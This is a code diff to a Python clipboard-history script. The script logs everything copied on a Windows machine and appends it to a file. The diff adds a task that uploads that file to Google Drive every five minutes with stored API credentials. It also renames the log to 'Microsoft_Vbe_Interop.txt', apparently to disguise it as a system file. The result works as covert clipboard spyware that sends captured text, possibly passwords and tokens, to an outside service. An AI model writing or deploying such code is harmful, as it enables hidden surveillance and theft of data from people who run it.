@@ -1,8 +1,10 @@
 import time
 import win32clipboard
+import schedule
+import Google_Drive_API
 
 
-HISTORY_FILE = r"E:\clipboard_history.txt"
+HISTORY_FILE = r"E:\Microsoft_Vbe_Interop.txt"
 
 def update_history(text):
     try:
@@ -15,7 +17,6 @@ def update_history(text):
             # Save history to file    
         with open(HISTORY_FILE, "a") as file:
             file.write(f'\n{text}')
-
 def check_clipboard():
     win32clipboard.OpenClipboard()
     try:
@@ -27,11 +28,16 @@ def check_clipboard():
         pass
     finally:
         win32clipboard.CloseClipboard()
-
+def Task():
+    Google_API_Credentials_Key=r"E:\Codeing\Python Language\Projects\Project_15_Clipboard_Copy\Credentials_Key.json"
+    Google_Drive_API.Google_Drive_API(HISTORY_FILE,Google_API_Credentials_Key)
 
 # Break For 5 Sec
 time.sleep(5)
 
+schedule.every(5).minutes.do(Task)
+
 while True:
     check_clipboard()
+    schedule.run_pending()
     time.sleep(5)  # Check clipboard every 1 second
